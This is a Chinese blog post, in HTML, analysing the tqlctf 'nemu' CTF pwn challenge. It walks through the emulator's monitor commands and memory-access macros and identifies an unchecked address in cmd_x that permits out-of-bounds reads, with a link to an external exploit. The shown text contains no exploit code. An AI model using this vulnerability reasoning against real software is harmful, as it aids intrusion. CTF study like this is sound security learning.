@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="tqlctf的nemu题目复现。开学了但是被疫情困在寝室，正好可以学习一番。主要基于官方wp。发现虚拟机很好的一点是会给源码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tqlctf-nemu">
+<meta property="og:url" content="https://nicholas-wei.github.io/2022/02/23/tqlctf-nemu/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="tqlctf的nemu题目复现。开学了但是被疫情困在寝室，正好可以学习一番。主要基于官方wp。发现虚拟机很好的一点是会给源码。">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220223213608778.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220223213701540.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220223233918362.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220223233716394.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220223234032507.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224110019517.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224110150166.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224140407445.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224140205513.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224141405879.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224113640343.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224145004149.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224145225528.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224145614691.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224150010870.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220224150252708.png">
+<meta property="article:published_time" content="2022-02-23T13:20:25.000Z">
+<meta property="article:modified_time" content="2022-02-24T07:58:14.000Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="VM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220223213608778.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>tqlctf-nemu | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-tqlctf-nemu" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/02/23/tqlctf-nemu/" class="article-date">
+      <time datetime="2022-02-23T13:20:25.000Z" itemprop="datePublished">2022-02-23</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      tqlctf-nemu
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VM/" rel="tag">VM</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>tqlctf的nemu题目复现。开学了但是被疫情困在寝室，正好可以学习一番。主要基于官方wp。发现虚拟机很好的一点是会给源码。</p>
+<span id="more"></span>
+
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>题目下载及exp</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Nicholas-wei/pwn/tree/main/tqlctf/nemu">https://github.com/Nicholas-wei/pwn/tree/main/tqlctf/nemu</a></p>
+<p>一道给了源码的虚拟机题。先看看有什么保护</p>
+<p><img src="/.io//image-20220223213608778.png" alt="image-20220223213608778"></p>
+<p>没有PIE，got表也可写。</p>
+<p>查看虚拟机源码，发现最主要的是这些指令</p>
+<p><img src="/.io//image-20220223213701540.png" alt="image-20220223213701540"></p>
+<p>接下来一个一个函数看过来(好像操作系统)</p>
+<h2 id="cmd-help"><a href="#cmd-help" class="headerlink" title="cmd_help"></a>cmd_help</h2><p>根据参数，输出指令对应的用处说明。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_help</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* extract the first argument */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *arg = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>); <span class="comment">// 寻找相应指令</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (arg == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* no argument given */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CMD; i ++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s - %s\n&quot;</span>, cmd_table[i].name, cmd_table[i].description);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CMD; i ++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arg, cmd_table[i].name) == <span class="number">0</span>) &#123; <span class="comment">// 在cmd_table中寻找到相应内容</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s - %s\n&quot;</span>, cmd_table[i].name, cmd_table[i].description);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Unknown command &#x27;%s&#x27;\n&quot;</span>, arg);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="cmd-c"><a href="#cmd-c" class="headerlink" title="cmd_c"></a>cmd_c</h2><p>调用cpu_exec函数。这个函数比较复杂，不分析了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_c</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line"></span><br><span class="line">  cpu_exec(<span class="number">-1</span>); <span class="comment">// 参数为-1表示一直执行</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="cmd-si"><a href="#cmd-si" class="headerlink" title="cmd_si"></a>cmd_si</h2><p>其实相当于调用cpu_exec一共n次。</p>
+<h2 id="cmd-info"><a href="#cmd-info" class="headerlink" title="cmd_info"></a>cmd_info</h2><p>可以查看断点以及寄存器</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_info</span><span class="params">(<span class="type">char</span> *args)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(args == <span class="literal">NULL</span>) &#123;<span class="built_in">printf</span>(<span class="string">&quot;Please input argument\n&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//split string</span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *n_str = strtok(args, <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(n_str,<span class="string">&quot;r&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//print all regeister</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s:\t%#010x\t&quot;</span>, regsl[i], cpu.gpr[i]._32);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(n_str,<span class="string">&quot;w&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">            list_watchpoint(); <span class="comment">// 查看监视点</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="cmd-x"><a href="#cmd-x" class="headerlink" title="cmd_x"></a>cmd_x</h2><p>可以查看内存的值。这里很有意思，可以像gdb一样。不知道gdb是不是也是这样实现的？</p>
+<p>这里注意，x并没有检查需要阅读的地址偏移量是否超出pmem的大小。如果超出可能岛主越界读。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_x</span><span class="params">(<span class="type">char</span> *args)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(args == <span class="literal">NULL</span>)&#123;<span class="built_in">printf</span>(<span class="string">&quot;Please input argument\n&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-10s\t%-10s\t%-10s\n&quot;</span>,<span class="string">&quot;Address&quot;</span>,<span class="string">&quot;DwordBlock&quot;</span>,<span class="string">&quot;DwordBlock&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *n_str = strtok(args, <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">memcmp</span>(n_str,<span class="string">&quot;0x&quot;</span>,<span class="number">2</span>))&#123; <span class="comment">// 如果是16进制并且只打印这个地址中的数字</span></span><br><span class="line"></span><br><span class="line">       <span class="type">long</span> addr = strtol(n_str,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%#010x\t&quot;</span>,(<span class="type">uint32_t</span>)addr);</span><br><span class="line"></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%#010x\n&quot;</span>,vaddr_read(addr,<span class="number">4</span>)); </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="comment">// 要打印地址中的多个数字</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n = atoi(n_str);</span><br><span class="line"></span><br><span class="line">        n_str = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> addr = strtol(n_str,<span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%#010x\t&quot;</span>,(<span class="type">uint32_t</span>)addr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">2</span>; i++)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%#010x\t&quot;</span>,vaddr_read(addr,<span class="number">4</span>)); <span class="comment">// 获取地址中的数据</span></span><br><span class="line"></span><br><span class="line">                addr += <span class="number">4</span>; <span class="comment">// 找到下一个地址</span></span><br><span class="line"></span><br><span class="line">                n--;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意其中的<code>vaddr_read</code>，提供了读取地址中的数值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> <span class="title function_">vaddr_read</span><span class="params">(<span class="type">vaddr_t</span> addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> paddr_read(addr, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">paddr_read</span><span class="params">(<span class="type">paddr_t</span> addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> pmem_rw(addr, <span class="type">uint32_t</span>) &amp; (~<span class="number">0u</span> &gt;&gt; ((<span class="number">4</span> - len) &lt;&lt; <span class="number">3</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pmem_rw(addr, type) *(type *)(&#123;\</span></span><br><span class="line"><span class="meta">    guest_to_host(addr); \</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* convert the guest physical address in the guest program to host virtual address in NEMU */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> guest_to_host(p) ((void *)(pmem + (unsigned)p))</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的guest就是NEMU中运行的进程的地址。hosu时NEMU。可以看到关键在于<code>pmem_rw</code>中对地址采取了解引用。而地址转换的具体过程就是<code>((void *)(pmem + (unsigned)p))</code>。那么pmem是什么？我们合理猜测他是某个基地址。p就是偏移。向上追溯，p其实是addr，而后面的length似乎只是一个NEMU中地址长度数据。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PMEM_SIZE (128 * 1024 * 1024)</span></span><br><span class="line"><span class="type">uint8_t</span> pmem[PMEM_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="cnd-w"><a href="#cnd-w" class="headerlink" title="cnd_w"></a>cnd_w</h2><p>用来设置watchpoint</p>
+<p>其中watchpoint的数据结构如下所示</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> NO;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Add more members if necessary */</span></span><br><span class="line"></span><br><span class="line"> <span class="type">char</span> <span class="built_in">exp</span>[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line"> <span class="type">uint32_t</span> old_val;</span><br><span class="line"></span><br><span class="line"> <span class="type">uint32_t</span> new_val;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; WP;</span><br></pre></td></tr></table></figure>
+
